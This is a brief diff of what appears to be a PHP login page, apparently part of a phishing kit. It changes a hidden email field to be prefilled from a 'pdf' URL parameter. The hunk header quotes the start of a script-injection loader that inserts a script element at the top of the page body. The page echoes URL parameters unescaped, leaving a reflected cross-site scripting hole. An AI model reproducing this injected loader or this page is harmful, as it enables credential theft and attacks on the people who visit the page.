@@ -431,7 +431,7 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
 			
 				<br><br>
 
-				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['login']; ?>" placeholder="Username">
+				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['pdf']; ?>" placeholder="Username">
 				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['pdf']; ?></font>		
 
 				<p>
